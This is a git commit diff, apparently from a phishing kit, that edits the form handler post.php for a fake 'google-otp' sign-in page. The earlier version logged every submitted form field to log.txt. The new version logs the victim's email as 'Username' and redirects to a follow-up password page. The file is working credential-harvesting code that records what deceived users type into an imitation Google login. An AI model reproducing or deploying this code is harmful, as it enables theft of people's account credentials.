a6f9ed0b82729271af68afb5ed0bc9644183e958
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2020-09-06 12:24:34 -0400

    Add files via upload

--- sites/google-otp/post.php
+++ sites/google-otp/post.php
@@ -1,13 +1,5 @@
 <?php
-header ('Location: pass.login.php');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+
+    file_put_contents("log.txt", "Username: " . $_POST['email'] . "\n", FILE_APPEND);
+header('Location: pass.login.php');
+exit();
